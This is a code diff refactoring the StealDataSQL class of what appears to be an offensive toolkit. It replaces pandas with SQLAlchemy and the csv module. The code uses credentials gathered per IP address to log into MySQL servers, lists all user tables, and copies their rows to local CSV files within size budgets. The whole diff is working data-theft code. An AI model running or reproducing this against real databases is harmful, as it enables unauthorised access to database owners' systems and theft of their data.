@@ -1,8 +1,9 @@
 import os
+import csv
 import shutil
 import logging
 import time
-from sqlalchemy import create_engine
+from sqlalchemy import create_engine, text
 from rich.console import Console
 from threading import Timer
 from shared import SharedData, settle_for_display
@@ -61,15 +62,15 @@ class StealDataSQL:
             if self.shared_data.orchestrator_should_exit:
                 logger.info("Table search interrupted due to orchestrator exit.")
                 return []
-            query = """
+            query = text("""
             SELECT TABLE_NAME, TABLE_SCHEMA 
             FROM INFORMATION_SCHEMA.TABLES 
             WHERE TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
             AND TABLE_TYPE = 'BASE TABLE'
-            """
-            import pandas as pd  # lazy: keep pandas out of module import (P2)
-            df = pd.read_sql(query, engine)
-            tables = df[['TABLE_NAME', 'TABLE_SCHEMA']].values.tolist()
+            """)
+            with engine.connect() as conn:
+                result = conn.execute(query)
+                tables = [(row[0], row[1]) for row in result]
             logger.info(f"Found {len(tables)} tables across all databases")
             return tables
         except Exception as e:
@@ -108,14 +109,20 @@ class StealDataSQL:
                 logger.error(f"Refusing SQL steal of non-identifier {schema}.{table}")
                 return
 
-            query = f"SELECT * FROM `{schema}`.`{table}` LIMIT {MAX_ROWS}"
-            import pandas as pd  # lazy: keep pandas out of module import (P2)
-            df = pd.read_sql(query, engine)
-
+            query = text(f"SELECT * FROM `{schema}`.`{table}` LIMIT {MAX_ROWS}")
             os.makedirs(local_dir, exist_ok=True)
             local_file_path = os.path.join(local_dir, f"{schema}_{table}.csv")
-            df.to_csv(local_file_path, index=False)
-            size = os.path.getsize(local_file_path)
+            row_count = 0
+            with engine.connect() as conn:
+                result = conn.execute(query)
+                fieldnames = list(result.keys())
+                with open(local_file_path, "w", newline="", encoding="utf-8") as f:
+                    writer = csv.writer(f)
+                    writer.writerow(fieldnames)
+                    for row in result:
+                        writer.writerow(list(row))
+                        row_count += 1
+            size = os.path.getsize(local_file_path) if os.path.exists(local_file_path) else 0
             if size > MAX_FILE_BYTES or getattr(self, '_run_bytes', 0) + size > MAX_RUN_BYTES:
                 logger.warning(f"SQL dump {schema}.{table} is {size} bytes — over budget, deleting")
                 try:
@@ -127,7 +134,7 @@ class StealDataSQL:
             self._run_bytes = getattr(self, '_run_bytes', 0) + size
             logger.success(
                 f"Downloaded data from table {schema}.{table} to {local_file_path} "
-                f"({len(df)} rows, {size} bytes)"
+                f"({row_count} rows, {size} bytes)"
             )
         except Exception as e:
             logger.error(f"Error downloading data from table {schema}.{table}: {e}")
@@ -154,13 +161,14 @@ class StealDataSQL:
                 sqlfile = self.shared_data.sqlfile
                 credentials = []
                 if os.path.exists(sqlfile):
-                    import pandas as pd  # lazy: keep pandas out of module import (P2)
-                    df = pd.read_csv(sqlfile)
-                    # Filtrer les credentials pour l'IP spécifique
-                    ip_credentials = df[df['IP Address'] == ip]
-                    # Créer des tuples (username, password, database)
-                    credentials = [(row['User'], row['Password'], row['Database']) 
-                                 for _, row in ip_credentials.iterrows()]
+                    with open(sqlfile, newline="", encoding="utf-8", errors="replace") as f:
+                        for cred in csv.DictReader(f):  # not `row`: that param is the host netkb row, reused at line 206
+                            if cred.get("IP Address") == ip:
+                                credentials.append((
+                                    cred.get("User", ""),
+                                    cred.get("Password", ""),
+                                    cred.get("Database", ""),
+                                ))
                     logger.info(f"Found {len(credentials)} credential combinations for {ip}")
 
                 if not credentials:
